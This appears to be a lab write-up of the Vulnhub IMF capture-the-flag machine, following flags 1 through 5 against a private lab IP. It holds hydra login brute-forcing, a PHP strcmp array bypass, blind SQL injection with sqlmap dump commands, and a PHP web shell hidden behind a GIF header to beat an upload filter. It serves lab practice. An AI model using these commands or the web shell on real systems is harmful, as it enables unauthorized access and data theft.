On the contact us page we get 3 emails:
```
rmichaels@imf.local -> Director
akeith@imf.local -> deputy Director
estone@imf.local -> chief of staff
```
***
### Flag 1
While checking the source code of this page we get the first flag:
`flag1{YWxsdGhlZmlsZXM=}`
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230715233303.png]]
the flag itself was base64 encoded said: `allthefiles`
*** 
### Flag 2
from the hist above:
we also get the second flag by decoding the names of the js files :
http://192.168.29.156/js/eVlYUnZjZz09fQ==.min.js -> 3
http://192.168.29.156/js/XUnRhVzVwYzNS.js -> 2
http://192.168.29.156/js/ZmxhZzJ7YVcxbVl.js -> 1
combining then we get the flag:
`flag2{aW1mYWRtaW5pc3RyYXRvcg==}` , hint: `imfadministrator`
***
## Flag 3
After a bit of finding , I thought maybe it was an endpoint and it was leading to a login page:
Ofcourse admin:admin didn't work:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230716000606.png]]

This was the source code:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230716000535.png]]

SQL injection maybe? but code said password is hard-coded , also error said 'invalid username' so username enum?
let's make the list:
```
roger
alexander
elizabeth
admin
imfadmin
rmichaels
akeith
estone
rmichaels@imf.local
akeith@imf.local
estone@imf.local
```

Nothing worked so I tried to automate the things , I used hydra to do so the command and the wordlists for the username and passwords are below:
```
hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt -s 80 -f http-get://192.168.90.184/imfadministrator
```
`seclists's Names/names.txt` and `rockyou.txt` for password
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230723231130.png]]
got: `aaliyah` and `123456`
That didn't work so I tried something different:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230723231502.png]]
look how for the same username but different , something wasn't right so I tried some username that they won't give:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230723231904.png]]
I'm telling y'all this so that you might see that this is what happens and people get stuck for hours
This is due to the fact that it loads the site with 200 but gives error text not response
So I used Burp:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230723233008.png]]
I also tried brtfrcing the password , nothing worked , so I tried directory enum on this endpoint:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230723234956.png]]
I also looked at the source code again , this had my curiosity:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230723235128.png]]
If it doesn't say anything about password , just invalid username and all , then why it is taking the password as 'pass'
Maybe in the back-end they mean by hardcoded is the password is already set and they are comparing the pass string we give to the already set so maybe we have to deal with this function that compares the string? we can only guess...so maybe bypassing the strcmp function:
In the strcmp description by php we get this guy at last telling about the behaviour of the function:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725154610.png]]
We need to make sure that the pass array is empty so we can do this via two ways:
* way 1: burp intruder:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725161220.png]]

* way 2 : via `array('')` :
just paste the above payload in password field
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725161112.png]]
`flag3{Y29udGludWVUT2Ntcw==}`
***
## Flag 4
hint: continueTOcms
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725161421.png]]
Disallowed list:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725161444.png]]
Upload:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725161707.png]]
I tried this image , analyzed it and via exif tool I got this:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725162013.png]]
after using the -b flag:
and strings command we get:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725162740.png]]
inside the cms , pagename parameter:
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725165735.png]]
when we make the sqlmap to make sure:
we have to supply our session id or else it'll reject:
```
sqlmap --url http://192.168.90.184/imfadministrator/cms.php?pagename=disavowlist --cookie='PHPSESSID=9rn93n6m80d9hbtk2c6rkc0o75'
```

![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725172337.png]]
we can do this manually :
`' AND '1'='1`
it's blind so we'll have to use sqlmap:
and via that we can find the tables via --tables options and dump them via:
```
sqlmap --url http://192.168.90.184/imfadministrator/cms.php?pagename=disavowlist --cookie='PHPSESSID=9rn93n6m80d9hbtk2c6rkc0o75' --dump -T pages 
```
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725174023.png]]
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230725174110.png]]
scan the QR and find the flag `flag4{dXBsb2Fkcjk0Mi5waHA=}`
decode it and we get: `uploadr942.php`

When we go to this page we see this upload functionality:

![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230726183026.png]]
We need to fool the WAF by passing it in the GIF format via adding the GIF98 in the start:
```
GIF98
<?php $c=$_GET['cmd']; echo `$c`;?>
```

![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230726183136.png]]
`flag5{YWdlbnRzZXJ2aWNlcw==}`
![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230726183826.png]]
agentservices

![[walkthroughs/Vulnhub/IMF*/IMG/Pasted image 20230805171749.png]]
		